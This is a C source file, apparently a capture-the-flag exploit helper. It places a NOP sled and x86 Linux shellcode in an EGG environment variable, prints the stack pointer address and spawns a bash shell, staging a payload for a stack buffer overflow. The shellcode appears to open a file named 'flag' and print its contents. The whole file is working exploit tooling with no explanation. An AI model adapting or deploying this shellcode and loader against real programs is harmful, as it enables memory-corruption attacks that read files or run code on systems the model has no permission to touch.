#include <stdlib.h>

#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x36\x5e\x31\xc0\xb0\x05\x89"
  "\xf3\x31\xc9\xcd\x80\x89\xc6\xeb\x07\x31\xdb\x89\xd8\x40\xcd\x80"
  "\xb0\x03\x89\xf3\x4c\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3"
  "\x74\xe7\xb0\x04\xb3\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x44\xeb\xe0"
  "\xe8\xc5\xff\xff\xff\x66\x6c\x61\x67"; // len = 4*16 + 9 = 73

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *ptr, *egg;
  long addr;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) eggsize = atoi(argv[1]);

  if (!(egg = malloc(eggsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp();
  printf("esp address in main(): 0x%x\n", addr);

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  egg[eggsize - 1] = '\0';

  memcpy(egg,"EGG=",4);   // payload: "EGG=" + nop*n + shellcode + '\0'
  putenv(egg);
  system("/bin/bash"); 
}

